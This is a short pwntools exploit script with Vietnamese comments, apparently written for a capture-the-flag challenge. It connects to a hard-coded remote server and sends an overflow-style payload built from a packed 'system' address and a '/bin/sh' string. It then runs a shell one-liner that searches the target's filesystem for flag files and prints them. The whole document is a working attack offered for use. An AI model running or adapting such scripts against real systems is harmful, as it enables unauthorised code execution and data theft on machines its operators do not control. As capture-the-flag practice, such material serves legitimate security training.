from pwn import *

# Thay các giá trị này cho phù hợp với challenge của bạn
host = "34.89.206.44"
port = 32626

# p = process('./your_binary_name') # Dùng khi test ở local
p = remote(host, port)              # Dùng khi kết nối tới server

system_addr = 0x004011b6
bin_sh_str = b"/bin/sh\x00"

payload = p64(system_addr) + bin_sh_str

p.sendlineafter(b"please input something\n", payload)

# Gửi lệnh one-liner thần thánh
command_to_run = b'cat $(find / -name "flag*" 2>/dev/null)'
p.sendline(command_to_run)

# Đọc flag
flag = p.recvall().decode()
print("FLAG IS: ")
print(flag)